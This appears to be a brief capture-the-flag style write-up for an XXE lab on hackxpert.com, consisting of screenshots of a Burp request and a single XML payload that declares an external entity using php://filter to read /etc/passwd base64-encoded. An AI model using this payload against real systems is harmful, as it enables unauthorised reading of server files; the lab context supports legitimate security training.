# URL :- `https://hackxpert.com/labs/XXE/00.php`

![image](https://user-images.githubusercontent.com/60841283/151135623-2ecad6d9-4b55-489d-a932-a3eacf788503.png)

POST request in Burp

![image](https://user-images.githubusercontent.com/60841283/151120373-ae4d5455-72fe-4d41-8202-87ebd1889f1c.png)

Payload
```html
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<cheese>
    <cheeseType>Test &xxe;</cheeseType>
</cheese>
```

![image](https://user-images.githubusercontent.com/60841283/151135732-60d7d5bb-b8a6-4220-9b7c-c593a9d0a549.png)

![image](https://user-images.githubusercontent.com/60841283/151135772-8cbcbc46-38f3-46a8-9213-69362dd0778d.png)
